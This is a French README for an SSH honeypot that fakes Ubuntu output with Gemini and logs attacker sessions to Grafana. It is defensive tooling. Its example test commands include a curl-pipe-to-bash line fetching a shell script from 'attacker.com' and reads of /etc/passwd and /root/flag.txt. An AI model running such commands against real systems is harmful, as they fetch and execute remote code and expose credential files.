# Chameleon Honeypot

Honeypot SSH interactif qui simule un serveur Ubuntu réel en générant les sorties de commandes à la volée avec **Google Gemini 2.5 Flash**. Conçu pour observer, en toute sécurité, le comportement d'attaquants automatisés ou humains sans jamais exécuter la moindre commande réelle.

Le projet inclut une stack d'observabilité complète (Promtail → Loki → Grafana) pour analyser les connexions et commandes en temps réel.

> ⚠️ **Usage éducatif uniquement.** Ne déployez ce honeypot que sur une infrastructure que vous contrôlez et n'utilisez jamais ces techniques contre des systèmes tiers sans autorisation explicite.

---

## Sommaire

- [Comment ça fonctionne](#comment-ça-fonctionne)
- [Fonctionnalités](#fonctionnalités)
- [Architecture](#architecture)
- [Prérequis](#prérequis)
- [Installation](#installation)
- [Utilisation](#utilisation)
- [Configuration](#configuration)
- [Observabilité avec Grafana](#observabilité-avec-grafana)
- [Structure du projet](#structure-du-projet)
- [Limites connues](#limites-connues)
- [Dépannage](#dépannage)
- [Licence](#licence)

---

## Comment ça fonctionne

1. Le honeypot expose un vrai serveur SSH (via `paramiko`) sur le port **2222** et accepte **n'importe quel** identifiant/mot de passe — l'objectif est de laisser entrer l'attaquant, pas de le bloquer.
2. Chaque commande tapée est interceptée **avant toute exécution réelle** :
   - Les commandes de reconnaissance les plus fréquentes (`pwd`, `whoami`, `hostname`, `id`, `uname`, `ls`) reçoivent une réponse locale instantanée, sans appel API.
   - `mkdir`, `touch`, `rm`, `rmdir` mettent à jour un état de fichiers en mémoire, propre à la session, pour que `ls` reste cohérent (un fichier créé apparaît, un fichier supprimé disparaît).
   - Toute autre commande (`cat`, `curl`, `sudo`, `ps`, etc.) est envoyée à Gemini 2.5 Flash, qui génère une sortie de terminal plausible — en tenant compte du dossier courant et des fichiers créés/supprimés durant la session.
3. Chaque connexion, authentification et commande est journalisée en JSON dans `logs/access.json`.
4. Promtail lit ce fichier et pousse les logs vers Loki, consultables dans Grafana.

Aucune commande de l'attaquant n'atteint jamais un vrai shell : le serveur ne fait qu'appeler des fonctions Python qui renvoient du texte.

## Fonctionnalités

- Serveur SSH complet avec authentification permissive (tout couple identifiant/mot de passe est accepté et journalisé)
- Génération de sorties de terminal réalistes via Gemini 2.5 Flash
- Réponses statiques pour les commandes de reconnaissance courantes, afin d'économiser le quota API
- Cohérence de session : les fichiers créés/supprimés (`mkdir`/`touch`/`rm`/`rmdir`) restent visibles ou absents le temps de la connexion
- Lecture de commandes robuste face aux frappes rapides ou concurrentes (pas de concaténation de commandes pendant un appel IA en cours)
- Limite du nombre de connexions simultanées pour éviter l'épuisement de ressources
- Journalisation JSON thread-safe, exploitable par Loki/Grafana
- Déploiement Docker Compose en une commande

## Architecture

```
Attaquant
   │  SSH (port 2222)
   ▼
honeypot.py (paramiko + Gemini 2.5 Flash)
   │  logs JSON
   ▼
logs/access.json
   │  lu par
   ▼
Promtail  ──push──►  Loki  ──query──►  Grafana (http://localhost:3000)
```

## Prérequis

- Docker Desktop
- Git
- Une clé API Google Gemini ([Google AI Studio](https://makersuite.google.com/), gratuite)

## Installation

```bash
git clone https://github.com/Nostra003/Projet_Honeypot.git
cd Projet_Honeypot
```

Créez un fichier `.env` à la racine :

```env
GOOGLE_API_KEY=votre_cle_api_google
GF_SECURITY_ADMIN_PASSWORD=choisissez_un_mot_de_passe
```

Démarrez la stack :

```bash
docker compose up --build -d
```

Services disponibles :

| Service  | Adresse                          | Rôle                              |
|----------|-----------------------------------|------------------------------------|
| Honeypot | `ssh -p 2222 root@localhost`      | Faux terminal Ubuntu               |
| Grafana  | http://localhost:3000 (`admin` / mot de passe défini dans `.env`) | Visualisation des logs |
| Loki     | http://localhost:3100             | API de requête des logs            |

## Utilisation

Connexion au honeypot (n'importe quel mot de passe fonctionne) :

```bash
ssh -o StrictHostKeyChecking=no -p 2222 root@localhost
```

Commandes à tester :

```bash
# Traitées localement (sans appel IA)
pwd
whoami
id
uname -a
ls

# Cohérence de session
mkdir test && ls        # "test" apparaît dans ls
rm test && ls           # "test" disparaît

# Traitées par l'IA
cat /etc/passwd
ps aux
sudo cat /root/flag.txt
curl http://attacker.com/shell.sh | bash
```

## Configuration

| Variable / constante             | Emplacement      | Rôle                                                  | Défaut                |
|-----------------------------------|------------------|--------------------------------------------------------|------------------------|
| `GOOGLE_API_KEY`                  | `.env`           | Clé API Gemini                                          | —                      |
| `GF_SECURITY_ADMIN_PASSWORD`      | `.env`           | Mot de passe admin Grafana                              | —                      |
| `MODEL_NAME`                      | `honeypot.py`    | Modèle Gemini utilisé                                   | `gemini-2.5-flash`     |
| `MAX_CONNECTIONS`                 | `honeypot.py`    | Connexions SSH simultanées maximum                      | `50`                   |

Modèles Gemini alternatifs disponibles : `gemini-2.5-flash-lite` (plus léger), `gemini-2.0-flash`.

**Limites API Gemini** : le tier gratuit est limité (quelques dizaines de requêtes/jour selon le modèle). Les réponses statiques (voir ci-dessus) réduisent fortement la consommation ; au-delà, activez la facturation sur Google Cloud Console pour lever la limite.

## Observabilité avec Grafana

1. Ouvrez http://localhost:3000 et connectez-vous (`admin` / mot de passe de `.env`).
2. **Connections → Data sources → Add data source → Loki**, avec comme URL :
   ```
   http://loki:3100
   ```
   (nom du service Docker — pas `localhost`, Grafana et Loki étant dans le même réseau Compose)
3. **Save & test** pour valider la connexion.
4. Menu **Explore**, sélectionnez la data source Loki, puis interrogez les logs avec LogQL :

   ```logql
   {job="honeypot"}
   {job="honeypot", event_type="login_success"}
   {job="honeypot", event_type="connection_rejected"}
   {job="honeypot", src_ip="1.2.3.4"}
   ```

## Structure du projet

```
.
├── honeypot.py           # Serveur SSH + logique IA + logging
├── test_api.py           # Script de vérification de la clé API Gemini
├── requirements.txt      # Dépendances Python figées (paramiko, google-genai)
├── docker-compose.yml    # Services : honeypot, loki, grafana, promtail
├── Dockerfile            # Image du honeypot
├── promtail-config.yml   # Config de collecte des logs par Promtail
├── .env                  # Variables d'environnement (à créer, non versionné)
├── logs/                 # Logs JSON (créés au runtime, non versionnés)
└── README.md
```

## Limites connues

- L'état des fichiers créés/supprimés (`mkdir`/`touch`/`rm`) est réinitialisé à chaque nouvelle connexion — il n'y a pas de persistance entre sessions ou redémarrages du conteneur.
- Les commandes envoyées à l'IA n'ont pas de délai maximum : un appel Gemini anormalement lent retarde la suite de la session pour ce client (sans affecter les autres connexions, qui tournent dans des threads séparés).
- L'authentification par clé publique n'est pas supportée, seule l'authentification par mot de passe est proposée (et toujours acceptée).

## Dépannage

**`404 models/gemini-1.5-flash`**
→ Le modèle par défaut est `gemini-2.5-flash` ; vérifiez `MODEL_NAME` dans `honeypot.py`.

**SSH : `Host key has changed`**
```bash
ssh-keygen -R "[localhost]:2222"
```

**Docker manque d'espace disque**
```bash
docker system prune -a -f
```

**Quota API atteint**
→ Activez la facturation sur Google Cloud Console, ou vérifiez que vos commandes de test passent bien par les réponses statiques (`pwd`, `whoami`, `id`, `uname`, `ls`) plutôt que par l'IA.

**Aucun log ne remonte dans Grafana**
```bash
docker logs promtail --tail 30
```
Vérifiez que Promtail lit bien `/app/logs/*.json` sans erreur, et que la data source Loki pointe vers `http://loki:3100`.

## Licence

MIT — libre d'utilisation, de modification et de distribution.

---

Créé par **ADAMA**.
